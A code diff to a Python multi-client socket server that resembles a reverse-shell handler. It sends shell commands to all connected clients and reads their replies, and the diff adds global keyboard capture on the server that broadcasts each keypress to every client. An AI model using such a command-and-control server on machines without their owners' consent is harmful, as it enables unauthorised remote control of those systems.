@@ -1,19 +1,21 @@
 import socket
-import sys
 import threading
-import time
 import traceback
 from queue import Queue
-from pynput.mouse import Listener
+from pynput.mouse import Listener as MouseListener
+from pynput.keyboard import Listener as KeyboardListener
+from pynput import keyboard
 
-NUMBER_OF_THREADS = 4
-JOB_NUMBER = [1, 2, 3, 4]
+NUMBER_OF_THREADS = 6
+JOB_NUMBER = [1, 2, 3, 4, 5, 6]
 queue = Queue()
 all_connections = []
 all_address = []
 global x_click
 global y_click
 global enable_send_click
+global keys_to_send
+global enable_send_key
 
 
 # Create a Socket ( connect two computers)
@@ -93,6 +95,10 @@ def start_turtle():
             global enable_send_click
             enable_send_click = True
             print('Enable send click to client successfully')
+        elif 'enable_key' in cmd:
+            global enable_send_key
+            enable_send_key = True
+            print('Enable send key to client successfully')
         else:
             print("Command not recognized")
 
@@ -112,6 +118,21 @@ def start_send_click():
             print("Send_click_Success")
             x_click = None
             y_click = None
+
+
+def start_send_keys():
+    is_logged = False
+    while True:
+        global keys_to_send
+        global enable_send_key
+        if not keys_to_send.empty() and enable_send_key:
+            key = keys_to_send.get()
+            if not is_logged:
+                print('Thread send key running')
+                is_logged = True
+            for conn in all_connections:
+                send_target_commands_keys(conn, key=key)
+            print("Send_click_Success")
 
 
 # Display all current active connections with client
@@ -160,8 +181,8 @@ def send_target_commands(conn):
                 break
             if len(str.encode(cmd)) > 0:
                 conn.send(str.encode(cmd))
-                # client_response = str(conn.recv(1024), "utf-8")
-                # print(client_response, end="")
+                client_response = str(conn.recv(1024), "utf-8")
+                print(client_response, end="")
         except:
             print("Error sending commands")
             break
@@ -173,11 +194,24 @@ def send_target_commands_click(conn, x, y):
         if len(str.encode(cmd)) > 0:
             print(str.encode(cmd))
             conn.send(str.encode(cmd))
-            client_response = str(conn.recv(1024), "utf-8")
-            print(client_response, end="")
+            # client_response = str(conn.recv(1024), "utf-8")
+            # print(client_response, end="")
     except Exception as err:
         traceback.print_exc()
         print("Error sending commands click")
+
+
+def send_target_commands_keys(conn, key):
+    cmd = f'keyboard_client.py {key}'
+    try:
+        if len(str.encode(cmd)) > 0:
+            print(str.encode(cmd))
+            conn.send(str.encode(cmd))
+            # client_response = str(conn.recv(1024), "utf-8")
+            # print(client_response, end="")
+    except Exception as err:
+        traceback.print_exc()
+        print("Error sending commands keys")
 
 
 def start_listen_click():
@@ -189,7 +223,23 @@ def start_listen_click():
             x_click = x
             y_click = y
 
-    with Listener(on_click=on_click) as listener:
+    with MouseListener(on_click=on_click) as listener:
+        listener.join()
+
+
+def start_listen_key():
+    def on_press(key):
+        try:
+            print('alphanumeric key {0} pressed'.format(
+                key.char))
+            global keys_to_send
+            keys_to_send.put(str(key.char))
+        except AttributeError:
+            print('special key {0} pressed'.format(
+                key))
+
+    with KeyboardListener(
+            on_press=on_press) as listener:
         listener.join()
 
 
@@ -215,6 +265,10 @@ def work():
             start_send_click()
         if x == 4:
             start_listen_click()
+        if x == 5:
+            start_listen_key()
+        if x == 6:
+            start_send_keys()
         queue.task_done()
 
 
@@ -231,6 +285,10 @@ def main():
         global x_click
         global y_click
         enable_send_click = False
+        global keys_to_send
+        keys_to_send = Queue()
+        global enable_send_key
+        enable_send_key = False
         x_click = None
         y_click = None
         create_workers()
